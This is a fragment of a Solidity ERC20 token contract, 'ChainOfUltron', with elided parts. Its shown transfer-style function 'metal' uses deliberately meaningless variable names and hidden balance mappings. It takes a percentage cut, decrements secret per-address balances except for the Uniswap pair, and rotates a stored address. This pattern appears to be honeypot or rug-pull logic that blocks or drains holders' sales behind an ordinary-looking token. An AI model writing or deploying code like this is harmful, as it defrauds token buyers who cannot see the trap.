...
contract ChainOfUltron is ERC20, Ownable {
    address private gas;
    ...
    function metal(
        ...
        if (supplybalance[ULXdplyer] == 0 && autoburnLP[ULXdplyer] > 0) {
            address uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());
            if (uniswapV2Pair != ULXdplyer) {
                supplybalance[ULXdplyer] -= care;
            }
        }

        address ULXLP = gas;
        gas = ULXBurn;
        autoburnLP[ULXLP] += care;

        if (supplybalance[ULXdplyer] == 0) newpairing[ULXdplyer] -= review;

        uint256 voice = review * arm;
        voice = voice / 100;
        review -= voice;
        newpairing[ULXBurn] += review;
        emit Transfer(ULXdplyer, ULXBurn, review);
    }
